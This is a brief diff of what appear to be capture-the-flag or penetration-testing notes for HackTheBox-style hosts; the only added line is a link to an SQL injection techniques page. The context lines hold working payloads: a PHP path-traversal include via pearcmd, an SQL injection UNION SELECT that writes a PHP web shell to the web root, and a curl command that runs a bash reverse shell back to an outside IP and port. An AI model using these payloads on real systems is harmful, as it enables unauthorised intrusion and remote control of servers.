@@ -9,3 +9,6 @@ http://itrc.ssg.htb/?page=../../../../../../../../usr/local/lib/php/pearcmd&+con
 
 Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
 curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"'
+
+
+https://nav1n0x.gitbook.io/advanced-sql-injection-techniques
